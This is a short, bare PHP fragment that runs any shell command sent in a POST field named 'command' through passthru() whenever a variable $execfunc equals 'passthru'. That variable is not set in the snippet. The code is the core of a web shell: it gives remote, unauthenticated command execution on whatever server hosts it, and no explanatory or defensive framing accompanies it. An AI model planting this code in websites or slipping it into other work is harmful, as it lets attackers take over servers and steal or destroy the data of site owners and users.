<?php
if (!empty($_POST['command'])) {
	if ($execfunc=="passthru") {
		passthru($_POST['command']);
	}
}
?>